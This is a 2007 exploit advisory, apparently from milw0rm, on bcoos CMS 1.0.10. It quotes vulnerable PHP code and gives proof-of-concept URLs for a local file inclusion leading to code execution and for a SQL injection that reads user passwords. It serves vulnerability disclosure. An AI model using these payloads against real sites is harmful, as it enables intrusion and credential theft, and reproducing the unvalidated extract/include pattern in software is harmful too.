@@ -1,0 +1,80 @@
+########################## WwW.BugReport.ir ###########################################
+#
+#      AmnPardaz Security Research & Penetration Testing Group
+#
+# Title: Bcoos Multiple Vulnerabilities
+# Vendor: http://www.bcoos.net/
+# Bugs: Local File Inclusion, Sql Injection
+# Vulnerable Version: bcoos 1.0.10 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix Available: No!
+#######################################################################################
+#
+# Leaders : Shahin Ramezany & Sorush Dalili
+# Team Members: Alireza Hasani ,Amir Hossein Khonakdar, Hamid Farhadi
+# Security Site: WwW.BugReport.ir - WwW.AmnPardaz.Com
+# Country: Iran
+# Contact : admin@bugreport.ir
+######################## Bug Description ###########################
+
+
+Description:
+--------------------
+Bcoos is a CMS coming from the cores of E-Xoops.
+
+Vulnerabilities:
+--------------------
++-->Local File Inclusion (Remote Code Execution)
+
+Code Snippet:
+
+/include/common.php line#89-98
+
+// ################# :: Register Globals Compatibility :: #################
+$globals_test = @ini_get('register_globals');
+if ( isset($globals_test) && empty($globals_test) ) {
+	// These still need some work :: Cookie|Server|Env are ok now.
+	if ( !empty($_GET) )  { extract($_GET, EXTR_SKIP);  }
+	if ( !empty($_POST) ) { extract($_POST, EXTR_OVERWRITE); }
+	define('_GLOBALS', FALSE);
+	} else {
+		define('_GLOBALS', TRUE);
+	}
+
+/include/common.php line#124-129
+
+// ################ Include page-specific lang file ################
+if ( isset($xoopsOption['pagetype']) ) {
+	if ( @file_exists(XOOPS_ROOT_PATH.'/language/'.$bcoosConfig['language'].'/'.$xoopsOption['pagetype'].'.php') ) {
+		include_once(XOOPS_ROOT_PATH.'/language/'.$bcoosConfig['language'].'/'.$xoopsOption['pagetype'].'.php');
+		} else {
+			include_once(XOOPS_ROOT_PATH.'/language/english/'.$xoopsOption['pagetype'].'.php');
+
+$xoopsOption['pagetype'] is not defined by default, so it's possible for an attacker to define
+it by both $_GET or $_POST methods to conduct Local file inclusion!
+Furthermore bcoos doesn't properly validate the content of user supplied Uploads!
+Attacker could upload php codes with .gif extension and include it using above vulnerability!
+
+POC: http://localhost/bcoos/modules/news/?xoopsOption[pagetype]=../../images/avatar/users/[uid].gif%00
+
++-->Banner Module Sql Injection
+
+Bcoos doesn't properly validate the user supplied Input in click.php that may result in Sql injection if banners modules is installed by Site admin!
+
+Code Snippet:
+
+/modules/banners/click.php line#4-6
+
+if ($_GET['bid']) {
+	$bid = $_GET['bid'];
+	$result = $db->query("SELECT clickurl FROM ".$db->prefix("banner_items")." WHERE bid=$bid");
+
+POC: http://localhost/bcoos/modules/banners/click.php?bid=-1 UNION SELECT pass FROM bcoos_users LIMIT 1
+
+Credit:
+--------------------
+Discovered by trueend5 (trueend5 yahoo com)
+AmnPardaz Security Research & Penetration Testing Group
+WwW.BugReport.ir
+
+# milw0rm.com [2007-11-20]
